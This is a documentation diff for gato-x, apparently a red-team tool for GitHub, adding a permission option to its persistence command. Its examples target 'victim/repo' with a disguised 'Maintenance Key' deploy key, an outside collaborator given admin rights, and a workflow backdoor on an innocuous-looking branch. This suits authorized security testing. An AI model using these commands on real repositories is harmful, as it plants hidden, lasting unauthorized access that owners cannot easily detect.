@@ -33,6 +33,7 @@ gato-x p [options]
 | Option | Description |
 |--------|-------------|
 | `--collaborator` | Invite outside collaborators to the repository (requires admin privileges) |
+| `--permission` | Permission level for collaborator invitations (pull, triage, push, maintain, admin). Defaults to 'admin' |
 
 #### Deploy Key Creation (Admin Required)
 
@@ -58,11 +59,14 @@ gato-x p [options]
 This technique invites external users as collaborators to maintain access to the repository.
 
 ```bash
-# Invite single collaborator
+# Invite single collaborator with default admin permission
 gato-x persistence --target org/repo --collaborator username1
 
-# Invite multiple collaborators
-gato-x persistence --target org/repo --collaborator username1 username2 username3
+# Invite multiple collaborators with push permission
+gato-x persistence --target org/repo --collaborator username1 username2 username3 --permission push
+
+# Invite collaborator with specific permission level
+gato-x persistence --target org/repo --collaborator username1 --permission maintain
 ```
 
 **How it works**:
@@ -120,8 +124,8 @@ gato-x persistence --target org/repo --pwn-request --branch-name feature/test
 # Step 1: Create deploy key for Git access
 gato-x persistence --target victim/repo --deploy-key --key-title "Maintenance Key" --key-path ./maint_key.pem
 
-# Step 2: Invite backup collaborator
-gato-x persistence --target victim/repo --collaborator backup-user
+# Step 2: Invite backup collaborator with admin privileges
+gato-x persistence --target victim/repo --collaborator backup-user --permission admin
 
 # Step 3: Create workflow backdoor
 gato-x persistence --target victim/repo --pwn-request --branch-name feature/ci-improvements
